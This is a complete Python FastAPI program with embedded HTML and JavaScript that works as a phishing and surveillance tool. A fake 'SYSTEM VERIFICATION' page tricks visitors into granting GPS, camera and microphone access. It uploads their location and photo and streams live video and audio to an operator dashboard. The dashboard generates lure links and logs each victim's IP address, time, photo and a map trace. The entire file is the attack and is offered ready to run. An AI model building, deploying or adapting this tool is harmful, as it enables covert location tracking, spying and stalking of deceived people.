import json, os, time
from pathlib import Path
from typing import List
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import uvicorn

app = FastAPI()
DB = Path(os.path.expanduser("~/sipel_db.json"))
if not DB.exists(): DB.write_text("[]")

def get_db(): return json.loads(DB.read_text())
def save_db(d): DB.write_text(json.dumps(d))

# === WEBSOCKET MANAGER ===
class ConnectionManager:
    def __init__(self):
        self.dashboards: List[WebSocket] = []
        self.targets: List[WebSocket] = []

    async def connect_dashboard(self, ws: WebSocket):
        await ws.accept()
        self.dashboards.append(ws)

    async def connect_target(self, ws: WebSocket):
        await ws.accept()
        self.targets.append(ws)

    def disconnect(self, ws: WebSocket):
        if ws in self.dashboards: self.dashboards.remove(ws)
        if ws in self.targets: self.targets.remove(ws)

    async def broadcast_to_dash(self, message: str):
        for d in self.dashboards:
            try: await d.send_text(message)
            except: pass

    async def broadcast_to_target(self, message: str):
        for t in self.targets:
            try: await t.send_text(message)
            except: pass

manager = ConnectionManager()

# === UI TARGET ===
TARGET_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SYS.VERIFY // SECURE</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
:root{--neon:#0ff;--danger:#f05;--bg:#050505;}
body{font-family:'Share Tech Mono',monospace;background:var(--bg);color:var(--neon);text-align:center;padding:40px 20px;overflow-x:hidden}
h2{text-shadow:0 0 10px var(--neon);letter-spacing:2px}
button{width:100%;padding:15px;margin:12px 0;border:1px solid var(--neon);background:transparent;color:var(--neon);font-family:inherit;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 0 10px rgba(0,255,255,0.2);transition:0.3s;text-transform:uppercase}
button:hover{background:var(--neon);color:var(--bg);box-shadow:0 0 20px var(--neon)}
button.danger{border-color:var(--danger);color:var(--danger);box-shadow:0 0 10px rgba(255,0,85,0.2)}
button.danger:hover{background:var(--danger);color:#fff;box-shadow:0 0 20px var(--danger)}
video{display:none} canvas{display:none}
#log{margin-top:20px;font-size:14px;color:#0f0;text-shadow:0 0 5px #0f0;min-height:20px}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(transparent 50%,rgba(0,255,255,0.05) 50%);background-size:100% 4px;pointer-events:none;z-index:999}
</style></head><body>
<div class="scanline"></div>
<h2>[ SYSTEM VERIFICATION ]</h2>
<p style="color:#888">ENCRYPTED CONNECTION ESTABLISHED.<br>REQUIRES BIOMETRIC & LOCATION ACCESS.</p>
<button onclick="ambilLokasi()">1. AUTHORIZE GPS</button>
<button onclick="mulaiKamera()">2. AUTHORIZE CAMERA</button>
<button class="danger" onclick="kirimSemua()">3. EXECUTE UPLOAD</button>
<button style="border-color:#0f0;color:#0f0;box-shadow:0 0 10px rgba(0,255,0,0.2)" onclick="startLive()">4. START LIVE FEED</button>
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<div id="log">> AWAITING INPUT_</div>

<script>
let stream=null, loc=null, wsLive=null, liveInterval=null;

async function ambilLokasi(){
  if(!navigator.geolocation) return document.getElementById('log').innerText="> ERR: NOT SUPPORTED";
  document.getElementById('log').innerText="> REQ GPS PERMISSION...";
  navigator.geolocation.getCurrentPosition(
    p => { loc={lat:p.coords.latitude, lon:p.coords.longitude}; document.getElementById('log').innerText="> GPS LOCKED."; },
    e => document.getElementById('log').innerText="> ERR: GPS DENIED."
  );
}

async function mulaiKamera(){
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
    document.getElementById('v').srcObject=stream;
    document.getElementById('log').innerText="> CAMERA ONLINE.";
  }catch(e){ document.getElementById('log').innerText="> ERR: CAM DENIED."; }
}

async function kirimSemua(){
  if(!loc) return document.getElementById('log').innerText="> ERR: GPS NOT LOCKED";
  if(!stream) return document.getElementById('log').innerText="> ERR: CAM OFFLINE";
  const v=document.getElementById('v'), c=document.getElementById('c');
  c.width=v.videoWidth; c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  const foto=c.toDataURL('image/jpeg',0.5);
  document.getElementById('log').innerText="> UPLOADING TO SERVER...";
  await fetch('/api/submit',{
    method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({lat:loc.lat, lon:loc.lon, foto:foto})
  });
  document.getElementById('log').innerText="> UPLOAD SUCCESS.";
}

async function startLive(){
  try{
    document.getElementById('log').innerText="> REQ LIVE ACCESS (CAM + MIC)...";
    // Minta izin mic dan kamera
    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: true });
    const v = document.getElementById('v');
    v.srcObject = mediaStream;
    
    // Koneksi WebSocket ke server
    const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
    wsLive = new WebSocket(protocol + window.location.host + '/ws/target');
    
    wsLive.onopen = () => {
      document.getElementById('log').innerText="> LIVE STREAMING ACTIVE...";
      
      // Stream Audio
      const audioTrack = mediaStream.getAudioTracks()[0];
      const audioRecorder = new MediaRecorder(new MediaStream([audioTrack]), { mimeType: 'audio/webm' });
      audioRecorder.ondataavailable = async (e) => {
        if(e.data.size > 0) {
          const reader = new FileReader();
          reader.readAsDataURL(e.data);
          reader.onloadend = () => {
            if(wsLive.readyState === WebSocket.OPEN)
              wsLive.send(JSON.stringify({ type: 'audio', data: reader.result }));
          };
        }
      };
      audioRecorder.start(500); // Kirim potongan audio tiap 0.5 detik

      // Stream Video (5 FPS biar hemat bandwidth)
      const canvas = document.getElementById('c');
      const ctx = canvas.getContext('2d');
      liveInterval = setInterval(() => {
        if(v.videoWidth > 0) {
          canvas.width = v.videoWidth / 2; // Perkecil resolusi
          canvas.height = v.videoHeight / 2;
          ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
          const frame = canvas.toDataURL('image/jpeg', 0.4);
          if(wsLive.readyState === WebSocket.OPEN)
            wsLive.send(JSON.stringify({ type: 'video', data: frame }));
        }
      }, 200); // 200ms = 5 frame per detik
    };
  }catch(e){ document.getElementById('log').innerText="> ERR: LIVE ACCESS DENIED."; }
}
</script></body></html>
"""

# === UI DASHBOARD ===
DASH_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>MURDANY // NEO-NET</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
:root{--bg:#050505;--panel:#0a0a0a;--cyan:#0ff;--pink:#f05;--text:#ccc;}
body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;padding:15px;max-width:520px;margin:auto}
h3{color:var(--cyan);text-align:center;text-shadow:0 0 10px var(--cyan);letter-spacing:2px;border-bottom:1px solid var(--cyan);padding-bottom:10px;}
/* Live Feed Box */
.live-box{border:1px solid var(--pink);padding:10px;margin-bottom:20px;border-radius:4px;background:#000;position:relative;display:none;}
.live-box.active{display:block;}
.live-box h4{margin:0 0 5px 0;color:var(--pink);font-size:12px;text-align:center;letter-spacing:1px;text-transform:uppercase;}
#liveImg{width:100%;border:1px solid #333;display:block;min-height:200px;background:#111;}
.audio-controls{margin-top:10px;text-align:center;}
audio{width:100%;height:30px;filter:invert(1);}
/* Link Generator Box */
.gen-box{border:1px dashed var(--cyan);padding:15px;margin-bottom:20px;border-radius:4px;background:rgba(0,255,255,0.05)}
.gen-box h4{margin:0 0 10px 0;color:var(--cyan);font-size:14px;letter-spacing:1px}
.gen-input{width:100%;padding:10px;background:#000;border:1px solid #333;color:#0f0;font-family:inherit;margin-bottom:10px;box-sizing:border-box;font-size:12px;}
.gen-btn{width:100%;padding:10px;background:var(--cyan);color:#000;border:none;font-weight:bold;font-family:inherit;cursor:pointer;text-transform:uppercase;margin-bottom:5px}
.gen-btn.alt{background:transparent;border:1px solid var(--cyan);color:var(--cyan)}
/* Cards */
.card{background:var(--panel);border:1px solid #222;border-left:4px solid var(--pink);border-radius:4px;padding:12px;margin-bottom:20px;display:flex;gap:12px;position:relative;}
.badge{position:absolute;top:0;right:0;background:var(--pink);color:#fff;font-size:10px;padding:2px 8px;font-weight:bold;}
.left{flex:1} .left img{width:100%;border:1px solid var(--cyan);border-radius:4px;}
.right{flex:1.5;font-size:11px;line-height:1.6;color:#aaa;}
.val{color:#fff;} .label{color:var(--cyan);font-weight:bold;}
.map-link{color:var(--pink);text-decoration:none;border-bottom:1px dashed var(--pink);}
.footer{text-align:center;font-size:10px;color:#444;margin-top:30px;letter-spacing:2px;}
</style></head><body>
<h3>MURDANY // NEO-NET</h3>

<div class="live-box" id="liveBox">
  <h4>LIVE INTERCEPT ACTIVE</h4>
  <img id="liveImg" alt="Menunggu stream...">
  <div class="audio-controls">
    <audio id="liveAudio" controls autoplay></audio>
  </div>
</div>

<div class="gen-box">
  <h4>> TARGET LINK GENERATOR</h4>
  <input type="text" id="rawLink" class="gen-input" readonly>
  <button class="gen-btn" onclick="copyLink()">Copy Link Target</button>
</div>

<div id="list"><p style="text-align:center;color:var(--cyan)">> SCANNING FOR PACKETS..._</p></div>
<div class="footer">SYS.ENGINE BY MURDANY © 2026</div>

<script>
const baseUrl = window.location.origin;
document.getElementById('rawLink').value = baseUrl + "/target";

function copyLink() {
  const copyText = document.getElementById("rawLink");
  navigator.clipboard.writeText(copyText.value);
  alert("Link Target dicopy!");
}

// === LIVE WEBSOCKET DASHBOARD ===
const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
const wsDash = new WebSocket(protocol + window.location.host + '/ws/dashboard');
let mediaSource = new MediaSource();
let sourceBuffer = null;
let audioQueue = [];
const liveAudio = document.getElementById('liveAudio');
liveAudio.src = URL.createObjectURL(mediaSource);

mediaSource.addEventListener('sourceopen', () => {
  try {
    sourceBuffer = mediaSource.addSourceBuffer('audio/webm; codecs="opus"');
    sourceBuffer.addEventListener('updateend', processQueue);
  } catch(e) { console.log("Audio mime error", e); }
});

function processQueue() {
  if (!sourceBuffer || sourceBuffer.updating || audioQueue.length === 0) return;
  sourceBuffer.appendBuffer(audioQueue.shift());
}

wsDash.onmessage = async (event) => {
  const msg = JSON.parse(event.data);
  const box = document.getElementById('liveBox');
  
  if (msg.type === 'video') {
    box.classList.add('active');
    document.getElementById('liveImg').src = msg.data;
  } 
  else if (msg.type === 'audio') {
    try {
      const res = await fetch(msg.data);
      const arrayBuffer = await res.arrayBuffer();
      audioQueue.push(arrayBuffer);
      if (sourceBuffer && !sourceBuffer.updating && mediaSource.readyState === 'open') {
        processQueue();
      }
    } catch(e) {}
  }
};

wsDash.onclose = () => {
  document.getElementById('liveBox').classList.remove('active');
};

// === LOG LIST ===
async function tick(){
  const res = await fetch('/api/data');
  const data = await res.json();
  const c = document.getElementById('list');
  c.innerHTML = '';
  if(data.length===0) return c.innerHTML = '<p style="text-align:center;color:var(--cyan)">> NO DATA INTERCEPTED_</p>';
  data.reverse().forEach((d) => {
    const div = document.createElement('div');
    div.className = 'card';
    div.innerHTML = `
      <div class="badge">CAPTURED</div>
      <div class="left"><img src="${d.foto || 'https://via.placeholder.com/150/0a0a0a/0ff?text=NO+IMG'}"></div>
      <div class="right">
        <div><span class="label">ID:</span> <span class="val">#${d.seq}</span></div>
        <div><span class="label">TIME:</span> <span class="val">${d.waktu}</span></div>
        <div><span class="label">IP:</span> <span class="val">${d.ip}</span></div>
        <div><a href="https://maps.google.com/?q=${d.lat},${d.lon}" target="_blank" class="map-link">> TRACE MAP</a></div>
      </div>
    `;
    c.appendChild(div);
  });
}
setInterval(tick, 3000); tick();
</script></body></html>
"""

@app.websocket("/ws/target")
async def ws_target(websocket: WebSocket):
    await manager.connect_target(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.broadcast_to_dash(data)
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.websocket("/ws/dashboard")
async def ws_dashboard(websocket: WebSocket):
    await manager.connect_dashboard(websocket)
    try:
        while True:
            await websocket.receive_text() # Keep alive
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def dash(): return DASH_HTML

@app.get("/target", response_class=HTMLResponse)
def target(): return TARGET_HTML

@app.post("/api/submit")
async def submit(request: Request):
    body = await request.json()
    ip = request.headers.get("X-Forwarded-For", request.client.host)
    now = time.strftime("%d-%m-%Y<br>%H:%M:%S")
    db = get_db()
    db.append({"seq": len(db)+1, "ip": ip, "waktu": now, "lat": body.get("lat"), "lon": body.get("lon"), "foto": body.get("foto")})
    save_db(db)
    return {"status":"ok"}

@app.get("/api/data")
def get_data(): return get_db()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
